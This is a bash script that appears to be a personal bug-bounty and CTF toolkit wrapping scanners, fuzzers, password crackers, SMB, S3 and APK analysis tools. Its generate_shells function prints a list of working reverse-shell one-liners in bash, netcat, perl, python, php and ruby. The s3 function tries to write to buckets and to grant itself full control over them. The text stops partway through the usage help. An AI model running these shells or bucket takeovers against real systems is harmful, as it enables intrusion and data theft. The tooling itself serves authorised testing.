#!/bin/bash
# shellcheck disable=SC1087,SC2181,SC2162,SC2013
###  S0mbra  ###
# BugBounty/CTF/PenTest/Hacking suite 
# collection of various wrappers, multi-commands, tips&tricks, shortcuts etc.
# CTX: bl4de@wearehackerone.com

HACKING_HOME="/Users/bl4de/hacking"

GRAY='\033[38;5;8m'
RED='\033[1;31m'
GREEN='\033[1;32m'
LIGHTGREEN='\033[32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
BLUE_BG='\033[48;5;4m'
LIGHTBLUE='\033[34m'
LIGHTBLUE_BG='\033[48;5;6m'
MAGENTA='\033[1;35m'
CYAN='\033[36m'

CLR='\033[0m'
NEWLINE='\n'

# config commands
set_ip() {
    export IP="$1"
}

# runs $2 port(s) against IP; then -sV -sC -A against every open port found
full_nmap_scan() {
    if [[ -z "$2" ]]; then 
        echo -e "$BLUE[s0mbra] Running full nmap scan against all ports on $1 ...$CLR"
        ports=$(nmap -p- --min-rate=1000 -T4 $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
        nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
    else
        echo -e "$BLUE[s0mbra] Running full nmap scan against $2 port(s) on $1 ...$CLR"
        echo -e "   ...search open ports...$CLR"
        ports=$(nmap --top-ports "$2" --min-rate=1000 -T4 $1 | grep open | cut -d'/' -f 1 | tr '\n' ',')
        echo -e "$BLUE[s0mbra] running version detection + nse scripts against $ports...$CLR"
        nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log -oX ./"$1".xml
    fi

    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# runs --top-ports $2 against IP
quick_nmap_scan() {
    if [[ -z "$2" ]]; then 
        echo -e "$BLUE[s0mbra] Running nmap scan against all ports on $1 ...$CYAN"
        nmap -p- --min-rate=1000 -T4 $1 
    else
        echo -e "$BLUE[s0mbra] Running nmap scan against top $2 ports on $1 ...$CYAN"
        nmap --top-ports $2 --min-rate=1000 -T4 $1
    fi
    
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# runs Python 3 built-in HTTP server on [PORT]
http() {
    echo -e "$BLUE[s0mbra] Running Simple HTTP Server in current directory on port $1$CLR"
    echo -e "$GRAY\navailable network interfaces:$YELLOW"
    ifconfig | grep -e 'inet\s' |cut -d' ' -f 2
    echo -e "$GRAY\navailable files/folders in SERVER ROOT: $CLR"
    ls -l
    echo -e "\n\n"
    if [[ -z "$1" ]]; then 
        PORT=7777; 
    else
        PORT=$1    
    fi
    python3 -m http.server $PORT
    echo -e "\n$BLUE[s0mbra] Done."
}

# runs john with rockyou.txt against hash type [FORMAT] and file [HASHES]
rockyou_john() {
    echo -e "$BLUE[s0mbra] Running john with rockyou dictionary against $1 of type $2$CLR"
    echo > "$HACKING_HOME"/tools/jtr/run/john.pot
    if [[ -n $2 ]]; then
        "$HACKING_HOME"/tools/jtr/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1" --format="$2"
        elif [[ -z $2 ]]; then
        "$HACKING_HOME"/tools/jtr/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1"
    fi
    cat "$HACKING_HOME"/tools/jtr/run/john.pot
    echo -e "\n$BLUE[s0mbra] Done."
}

# ZIP password cracking with rockyou.txt
rockyou_zip() {
    echo -e "$BLUE[s0mbra] Running $MAGENTA zip2john $BLUE and prepare hash for hashcat..."
    "$HACKING_HOME"/tools/jtr/run/zip2john "$1" | cut -d ':' -f 2 > ./hashes.txt
    echo -e "$BLUE[s0mbra] Starting $MAGENTA hashcat $BLUE (using $YELLOW rockyou.txt $BLUE dictionary against $YELLOW hashes.txt $BLUE file)...$CLR"
    hashcat -m 13600 ./hashes.txt ~/hacking/dictionaries/rockyou.txt
    echo -e "\n$BLUE[s0mbra] Done."
}

# converts id_rsa to JTR format for cracking SSH key
ssh_to_john() {
    echo -e "$BLUE[s0mbra] Converting SSH id_rsa key to JTR format to crack it$CLR"
    python "$HACKING_HOME"/tools/jtr/run/sshng2john.py "$1" > "$1".hash
    echo -e "$BLUE[s0mbra] We have a hash.\n"
    echo -e "$BLUE[s0mbra] Let's now crack it!"
    rockyou_john "$1".hash
    echo -e "\n$BLUE[s0mbra] Done."
}

# runs unminify on $1 JavaScript file
um() {
    FILENAME=$1
    echo -e "$BLUE[s0mbra] Unminify $FILENAME...$CLR"
    unminify $FILENAME > unmimified.$FILENAME
    echo -e "\n$BLUE[s0mbra] Done."
}

# static code analysis of npm module installed in ~/node_modules
# with nodestructor and semgrep
snyktest() {
    echo -e "$BLUE[s0mbra] Starting snyk test in current directory...$CLR"
    snyk test
    echo -e "\n$BLUE[s0mbra] Done."
}

# enumerates SMB shares on [IP] - port 445 has to be open
smb_enum() {
    if [[ -z $2 ]]; then
        username='NULL'
    elif [[ -n $2 ]]; then
        username="$2"
    fi

    if [[ -z $3 ]]; then
        password=''
    elif [[ -n $3 ]]; then
        password="$3"
    fi

    echo -e "$BLUE[s0mbra] Enumerating SMB shares with nmap on $1...$CLR"
    nmap -Pn -p445 --script=smb-enum-shares.nse,smb-enum-users.nse "$1"
    echo -e "$YELLOW\n[s0mbra] smbmap -u $username -p $password against\t\t -> $1...$CLR"
    smbmap -H "$1" -u "$username" -p "$password" 2>&1 | tee __disks
    for d in $(grep 'READ' __disks | cut -d' ' -f 1); do
        echo -e "$YELLOW\n[s0mbra] content of $d directory saved to $1__shares_listings $CLR"
        smbmap -H "$IP" -u "$username" -p "$password" -R "$d" >> "$1"__shares_listings
    done
    rm -f __disks
    echo -e "\n$BLUE[s0mbra] Done."
}

# download file from SMB share
smb_get_file() {
    if [[ -z $2 ]]; then
        username='NULL'
    elif [[ -n $2 ]]; then
        username="$2"
    fi

    if [[ -z $3 ]]; then
        password=''
    elif [[ -n $3 ]]; then
        password="$3"
    fi

    echo -e "$BLUE[s0mbra] Downloading file $4 from $1...$CLR"
    echo -e "$GREEN"
    smbmap -H "$1" -u "$2" -p "$3" --download "$4"
    echo -e "$CLR"
    echo -e "\n$BLUE[s0mbra] Done."
}

# mounts SMB share at ./mnt/shares
smb_mount() {
    echo -e "$BLUE[s0mbra] Mounting SMB $2 share from $1 at ./mnt/shares...$CLR"
    mkdir -p mnt/shares
    echo "//$3@$1/$2"
    mount_smbfs "//$3@$1/$2" ./mnt/shares
    echo -e "$YELLOW\n[s0mbra] Locally available shares:\n.$CLR"
    ls -l ./mnt/shares
    echo -e "\n$BLUE[s0mbra] Done."
}

# umounts from ./mnt/shares and delete it
smb_umount() {
    echo -e "$BLUE[s0mbra] Unmounting SMB share(s) from ./mnt/shares...$CLR"
    umount ./mnt/shares
    rm -rf ./mnt
    echo -e "\n$BLUE[s0mbra] Done."
}

# if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
# we can enumerate nfs shares available:
nfs_enum() {
    echo -e "$BLUE[s0mbra] Enumerating nfs shares (TCP 2049) on $1...$CLR"
    nmap -Pn -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount "$1"
    echo -e "\n$BLUE[s0mbra] Done."
}

# quick subdomain enum + available HTTP server(s) - to find out if a program is 
# actually worth to look into :D
lookaround() {
    TMPDIR=$(pwd)
    START_TIME=$(date)
    echo -e "$BLUE[s0mbra] Let's see what we've got here...$CLR\n"

    # sublister
    echo -e "\n$GREEN--> sublister$CLR\n"
    for domain in $(cat scope); do
        sublister -v -d $domain -o "$TMPDIR/s0mbra_recon_sublister_$domain.tmp"
    done
    
    # subfinder
    echo -e "\n$GREEN--> subfinder$CLR\n"
    subfinder -nW -all -v -dL $1 -o $TMPDIR/s0mbra_recon_subfinder.tmp

    # prepare list of uniqe subdomains
    cat s0mbra_recon_sub* > step1
    sed 's/<BR>/#/g' step1 | tr '#' '\n' > step2
    sort -u -k 1 step2 > s0mbra_recon_subdomains_final.tmp
    rm -f step*

    # httpx
    echo -e "\n$GREEN--> httpx$CLR\n"
    httpx -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -silent -status-code -web-server -tech-detect -l $TMPDIR/s0mbra_recon_subdomains_final.tmp -o $TMPDIR/s0mbra_recon_httpx.tmp

    END_TIME=$(date)
    echo -e "$GREEN\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    echo -e "  $GRAY sublister+subfinder found \t $YELLOW $(echo `wc -l $TMPDIR/s0mbra_recon_subdomains_final.tmp` | cut -d" " -f 1) $GRAY subdomains"
    echo -e "  $GRAY httpx found \t\t $YELLOW $(echo `wc -l $TMPDIR/s0mbra_recon_httpx.tmp` | cut -d" " -f 1) $GRAY active web servers $GREEN"
    echo -e "  $GRAY HTTP servers responding 200 OK: $CLR\n"
    grep 200 $TMPDIR/s0mbra_recon_httpx.tmp
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# automated recon: subfinder + nmap + httpx + ffuf | on domain(s) -> save to scope file
recon() {
    TMPDIR=$(pwd)
    START_TIME=$(date)
    echo -e "$BLUE[s0mbra] Running quick, dirty recon on $1 domain: subfinder + httpx + ffuf on 200 OK...$CLR\n"

    # subfinder
    echo -e "\n$GREEN--> subfinder$CLR\n"
    subfinder -nW -all -v -dL $1 -o $TMPDIR/s0mbra_recon_subfinder.tmp

    # nmap
    echo -e "\n$GREEN--> nmap (top 1000 ports)$CLR\n"
    nmap --min-rate=1000 -T4 -iL $TMPDIR/s0mbra_recon_subfinder.tmp --top-ports 100 -n --disable-arp-ping -sV -A -oN $TMPDIR/s0mbra_recon_nmap.tmp -oX $TMPDIR/s0mbra_recon_nmap.xml

    # httpx
    echo -e "\n$GREEN--> httpx$CLR\n"
    httpx -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -silent -status-code -web-server -tech-detect -l $TMPDIR/s0mbra_recon_subfinder.tmp -o $TMPDIR/s0mbra_recon_httpx.tmp

    # ffuf - starter + lowercase enumeration
    echo -e "\n$GREEN--> ffuf on HTTP 200 from httpx$CLR\n"
    for url in $(cat $TMPDIR/s0mbra_recon_httpx.tmp | grep "200" | cut -d' ' -f1); 
    do
        NAME=$(echo $url | cut -d'/' -f3)
        ffuf -ac -c -w $DICT_HOME/starter.txt -u $url/FUZZ -mc=200,301,302,403,422,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/s0mbra_recon_ffuf_starter_$NAME.log
        ffuf -ac -c -w $DICT_HOME/lowercase.txt -u $url/FUZZ/ -mc=200,301,302,403,422,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/s0mbra_recon_ffuf_lowercase_$NAME.log
    done

    END_TIME=$(date)
    echo -e "\n$GREEN[s0mbra] Finished!"
    echo -e "\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    echo -e "  subfinder output file -> $GRAY $TMPDIR/s0mbra_subfinder.tmp$GREEN"
    echo -e "  httpx output file -> $GRAY $TMPDIR/s0mbra_httpx.tmp$GREEN"
    echo -e "  nmap output file -> $GRAY $TMPDIR/s0mbra_recon_nmap.tmp"
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# does recon on URL: nmap, ffuf, other smaller tools, ...?
# pass ONLY hostname (without protocol prefix)
ransack() {
    HOSTNAME=$1

    # set options:
    NMAP=$(echo $2|grep 'nmap'|wc -l)
    NIKTO=$(echo $2|grep 'nikto'|wc -l)
    VHOSTS=$(echo $2|grep 'vhosts'|wc -l)
    FFUF=$(echo $2|grep 'ffuf'|wc -l)
    FEROXBUSTER=$(echo $2|grep 'feroxbuster'|wc -l)
    X8=$(echo $2|grep 'x8'|wc -l)

    # set proto:
    if [[ -z $3 ]]; then
        PROTO='https'
    else
        PROTO=$3
    fi

    # setup output directory
    rm -rf $(pwd)/s0mbra
    mkdir -vp $(pwd)/s0mbra
    TMPDIR=$(pwd)/s0mbra

    START_TIME=$(date)
    echo -e "$BLUE[s0mbra] Running bruteforced, dirty, noisy as hell recon on $PROTO://$HOSTNAME \n\t using selected options: $2...$CLR"

    # onaws
    echo -e "\n$GREEN--> onaws? $CLR\n"
    onaws $HOSTNAME

    # nmap
    if [[ $NMAP -eq "1" ]]; then
        echo -e "\n$GREEN--> nmap (top 100 ports + version discovery + nse scripts)$CLR\n"
        nmap --top-ports 100 -n --disable-arp-ping -sV -A -oN $TMPDIR/s0mbra_nmap_$HOSTNAME.tmp $HOSTNAME
    fi

    # nikto
    if [[ $NIKTO -eq "1" ]]; then
        echo -e "\n$GREEN--> nikto (max. 10 minutes) $CLR\n"
        nikto -host $PROTO://$HOSTNAME -404code 404,301,302,304 -maxtime 10m -o $TMPDIR/s0mbra_nikto_$HOSTNAME.log -Format txt -useragent "bl4de/HackerOne"
    fi

    if [[ $VHOSTS -eq "1" ]]; then
        # vhosts enumeration
        ffuf -ac -c -w $DICT_HOME/vhosts -u $PROTO://$HOSTNAME/FUZZ -mc=200,206,301,302,403,422,429,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -H "Host: FUZZ.$HOSTNAME" -o $TMPDIR/s0mbra_recon_ffuf_vhosts_fullnames_$HOSTNAME.log
    
        ffuf -ac -c -w $DICT_HOME/vhosts -u $PROTO://$HOSTNAME/FUZZ -mc=200,206,301,302,403,422,429,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -H "Host: FUZZ" -o $TMPDIR/s0mbra_recon_ffuf_vhosts_$HOSTNAME.log
    fi

    # ffuf
    if [[ $FFUF -eq "1" ]]; then
        ffuf -ac -c -w $DICT_HOME/starter.txt -u $PROTO://$HOSTNAME/FUZZ -mc=200,206,301,302,403,422,429,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/s0mbra_recon_ffuf_starter_$HOSTNAME.log
        ffuf -ac -c -w $DICT_HOME/lowercase.txt -u $PROTO://$HOSTNAME/FUZZ/ -mc=200,206,301,302,403,422,429,500 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" -o $TMPDIR/s0mbra_recon_ffuf_lowercase_$HOSTNAME.log
    fi

    # feroxbuster
    if [[ $FEROXBUSTER -eq "1" ]]; then
        feroxbuster -f -d 1 --insecure -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de" --url $PROTO://$HOSTNAME -w $DICT_HOME/wordlist.txt --output $TMPDIR/s0mbra_feroxbuster_$HOSTNAME.log
    fi

    # x8
    if [[ $X8 -eq "1" ]]; then
        x8 -u $PROTO://$HOSTNAME/ -w $DICT_HOME/urlparams.txt -c 10
    fi

    END_TIME=$(date)
    echo -e "\n$GREEN[s0mbra] Finished!"
    echo -e "\nstarted at: $RED  $START_TIME $GREEN"
    echo -e "finished at: $RED $END_TIME $GREEN\n"
    
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

fu() {
    clear
    # adjust here to add/remove HTTP response status code(s) to match on:
    HTTP_RESP_CODES=200,206,301,302,403,500
    
    echo -e "$BLUE[s0mbra] Enumerate web resources on $1 with $2.txt dictionary matching $HTTP_RESP_CODES...$CLR"
    
    if [[ -n $3 ]]; then
        if [[ $3 == "/" ]]; then
            # if $3 arg passed to fu equals / - add at the end of the path (for dir enumerations where sometimes
            # dir path has to end with / to be identified
            ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ/ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
        else
            # if $3 arg is not /, treat it as file extension to enumerate files:
            ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ.$3 -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
        fi
    else
        ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ -mc $HTTP_RESP_CODES -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

api_fuzz() {
    clear
    echo -e "$BLUE[s0mbra] Fuzzing $1 API with httpie using endpoints file $2...$CLR"
    
    for endpoint in $(cat $2); do
        https --print=HBh --all --follow POST https://$1/$endpoint payload=data
        https --print=HBh --all --follow PUT https://$1/$endpoint payload=data
    done
 
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

fufilter() {
    clear
    # adjust here to add/remove HTTP response status code(s) to match on:
    HTTP_RESP_CODES=200,206,301,302,403,500
    
    echo -e "$BLUE[s0mbra] Enumerate web resources on $1 with $2.txt dictionary matching $HTTP_RESP_CODES... (filter size: $3) $CLR"
    
    if [[ -n $4 ]]; then
        if [[ $4 == "/" ]]; then
            # if $3 arg passed to fu equals / - add at the end of the path (for dir enumerations where sometimes
            # dir path has to end with / to be identified
            ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ/ -mc $HTTP_RESP_CODES -H -fs $3 "X-Bug-Bounty: HackerOne-bl4de" -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
        else
            # if $3 arg is not /, treat it as file extension to enumerate files:
            ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ.$4 -mc $HTTP_RESP_CODES -fs $3 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
        fi
    else
        ffuf -ac -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1FUZZ -mc $HTTP_RESP_CODES -fs $3 -H "User-Agent: wearehackerone" -H "X-Hackerone: bl4de"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

kiterunner() {
    HOSTNAME=$1
    echo -e "$BLUE[s0mbra] Running kiterunner using apis file...$CLR\n"

    kr scan apis -w $DICT_HOME/routes-large.kite -x 20 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# Python Static Source Code analysis
pysast() {
    DIR_NAME=$1
    echo -e "$BLUE[s0mbra] Running pyflakes against $DIR_NAME $CLR\n"
    python3 -m pyflakes $DIR_NAME

    echo -e "$BLUE[s0mbra] Running mypy against $DIR_NAME $CLR\n"
    python3 -m mypy $DIR_NAME

    echo -e "\n$BLUE[s0mbra] Running bandit against $DIR_NAME $CLR\n"
    python3 -m bandit -r $DIR_NAME

    echo -e "\n$BLUE[s0mbra] Running vulture against $DIR_NAME $CLR\n"
    python3 -m vulture $DIR_NAME

    echo -e "\n$BLUE[s0mbra] Done.$CLR"
}

# checking AWS S3 bucket
s3() {
    echo -e "$BLUE[s0mbra] Checking AWS S3 $1 bucket$CLR"
    aws s3 ls "s3://$1" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ content of the bucket can be listed!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- could not list the content... :/$CLR"
    fi

    touch test.txt
    echo 'TEST' >> test.txt
    aws s3 cp test.txt "s3://$1/test.txt" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ WOW!!! We can copy files to the bucket!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, cp does not work... :/$CLR"
    fi
    rm -f test.txt

    declare -a s3api=(
        "get-bucket-acl" 
        "put-bucket-acl" 
        "get-bucket-website" 
        "get-bucket-cors"
        "get-bucket-lifecycle-configuration" 
        "get-bucket-policy" 
        "list-bucket-metrics-configurations"
        "list-multipart-uploads" 
        "list-object-versions" 
        "list-objects"
    )
    for cmd in "${s3api[@]}"; do
        echo -e "---------------------------------------------------------------------------------"
        aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        if [[ "$?" == 0 ]]; then
            echo -e "\n\n$GREEN+  $cmd works!$CLR\n"
            aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        elif [[ "$?" != 0 ]]; then
            echo -e "\n$RED- nope, $cmd does not seem to be working... :/$CLR"
        fi
    done

    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=bl4de@wearehackerone.com 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  We can grant full control!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, can't grant control with --grant-full-control ... :/$CLR"
    fi
    echo -e "\n$BLUE[s0mbra] Done."
}

s3go() {
    clear
    echo -e "$BLUE[s0mbra] Getting $2 from $1 bucket...$CLR"

    aws s3api get-object-acl --bucket "$1" --key "$2" 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ We can read ACL of $3$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't check $2 ACL... :/$CLR"
    fi

    aws s3api get-object --bucket "$1" --key "$2" "$1".downloaded 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  $2 downloaded in current directory as $2.downloaded$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't get $2 :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

dex_to_jar() {
    clear
    echo -e "$BLUE[s0mbra] Exporting $1 into .jar...$CLR"
    d2j-dex2jar --force $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

unjar() {
    clear
    echo -e "$BLUE[s0mbra] Opening $1 in JD-Gui...$CLR"
    java -jar /Users/bl4de/hacking/tools/Java_Decompilers/jd-gui-1.6.3.jar $1
}

disass() {
    clear
    echo -e "$BLUE[s0mbra] Disassembling $1, saving to 1.asm..."
    objdump -d --arch-name=x86-64 -M intel $1 > 1.asm
    echo -e "\n$BLUE[s0mbra] Done."
}

jadx() {
    clear
    echo -e "$BLUE[s0mbra] Opening $1 in JADX...$CLR"
    /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx-gui $1
}

gql() {
    clear
    echo -e "$BLUE[s0mbra] Running GraphQL-Cop against $1...$CYAN"
    python3 /Users/bl4de/hacking/tools/graphql-cop/graphql-cop.py -t $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

apk() {
    clear
    echo -e "$BLUE[s0mbra] OK, let's see this APK...$CLR"
    unzip -d unzipped $1
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ Unizpped, now run apktool on it...$CLR"
        apktool d $1
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- unzipping .apk failed :/... :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

abe() {
    clear
    echo -e "$BLUE[s0mbra] Extracting $1.ab backup into $1.tar...$CLR"
    java -jar /Users/bl4de/hacking/tools/Java_Decompilers/android-backup-extractor/build/libs/abe.jar unpack $1.ab $1.tar
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN[s0mbra] Success! $1.ab unpacked and $1.tar was created..."
        echo -e "[s0mbra] Let's untar some files, shall we?$CLR"
        rm -rf $1_extracted && mkdir ./$1_extracted
        tar -xf $1.tar -C $1_extracted
        echo -e "\n$GREEN[s0mbra] tar extracted, folder(s) created:$CLR"
        ls -l $1_extracted
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- Damn... :/$CLR"
    fi
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

generate_shells() {
    clear
    port=$2

    echo -e "$BLUE[s0mbra] OK, here are your shellz...\n$CLR"

    echo -e " $CLR[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
    echo -e " $CLR[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
    echo -e " $CLR[bash]\033[0m rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
    echo -e " $CLR[bash]\033[0m rm -f backpipe; mknod /tmp/backpipe p && nc $ip $port 0<backpipe | /bin/bash 1>backpipe"
    echo -e "$NEWLINE"
    echo -e "\033[1;34m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo -e "\033[1;34m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo -e "\033[1;34m[perl (Windows)]\033[0m perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo -e "$NEWLINE"
    echo -e "\033[1;36m[python]\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
    echo -e "$NEWLINE"
    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);shell_exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);system(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);popen(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "$NEWLINE"
    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo -e "$NEWLINE"
    echo -e "\033[36m[netcat]\033[0m nc -e /bin/sh $1 $port"
    echo -e "\033[36m[netcat]\033[0m nc -c /bin/sh $1 $port"
    echo -e "\033[36m[netcat]\033[0m /bin/sh | nc $1 $port"
    echo -e "\033[36m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
    echo -e "\033[36m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

defcreds() {
    echo -e "$BLUE[s0mbra] Looking for default credentials for $1...$CLR"
    creds search $1
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

b64() {
    echo -e "$BLUE[s0mbra] Decoding Base64 string...$CLR"
    echo $1 | base64 -D
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

cmd=$1
clear

case "$cmd" in
    set_ip)
        set_ip "$2"
    ;;
    lookaround)
        lookaround "$2"
    ;;
    recon)
        recon "$2"
    ;;
    ransack)
        ransack "$2" "$3" "$4"
    ;;
    kiterunner)
        kiterunner "$2"
    ;;
    pysast)
        pysast "$2"
    ;;
    full_nmap_scan)
        full_nmap_scan "$2" "$3"
    ;;
    quick_nmap_scan)
        quick_nmap_scan "$2" "$3"
    ;;
    http)
        http "$2"
    ;;
    rockyou_john)
        rockyou_john "$2" "$3"
    ;;
    rockyou_zip)
        rockyou_zip "$2"
    ;;
    ssh_to_john)
        ssh_to_john "$2"
    ;;
    defcreds)
        defcreds "$2"
    ;;
    um)
        um "$2"
    ;;
    snyktest)
        snyktest
    ;;
    gql)
        gql "$2"
    ;;
    dex_to_jar)
        dex_to_jar "$2"
    ;;
    jadx)
        jadx "$2"
    ;;
    apk)
        apk "$2"
    ;;
    abe)
        abe "$2"
    ;;
    unjar)
        unjar "$2"
    ;;
    disass)
        disass "$2"
    ;;
    smb_enum)
        smb_enum "$2" "$3" "$4"
    ;;
    smb_get_file)
        smb_get_file "$2" "$3" "$4" "$5"
    ;;
    smb_mount)
        smb_mount "$2" "$3" "$4"
    ;;
    smb_umount)
        smb_umount
    ;;
    nfs_enum)
        nfs_enum "$2"
    ;;
    s3)
        s3 "$2"
    ;;
    b64)
        b64 "$2"
    ;;
    fu)
        fu "$2" "$3" "$4"
    ;;
    fufilter)
        fufilter "$2" "$3" "$4" "$5"
    ;;
    apifuzz)
        api_fuzz "$2" "$3"
    ;;
    s3go)
        s3go "$2" "$3"
    ;;
    generate_shells)
        generate_shells "$2" "$3"
    ;;
    *)
        clear
        echo -e "$GREEN I'm guessing there's no chance we can take care of this quietly, is there? - S0mbra$CLR"
        echo -e "--------------------------------------------------------------------------------------------------------------"
        echo -e "Usage:\t$YELLOW s0mbra.sh {cmd} {arg1} {arg2}...{argN}$CLR\n"
        echo -e "$BLUE_BG:: BUG BOUNTY RECON ::\t\t\t\t\t$CLR"
        echo -e "\t$CYAN lookaround $GRAY[DOMAIN]$CLR\t\t\t\t -> just look around... (subfinder + httpx on discovered hosts)"
        echo -e "\t$CYAN recon $GRAY[DOMAIN]$CLR\t\t\t\t\t -> basic recon: subfinder + nmap + httpx + ffuf (one tool at the time on all hosts)"
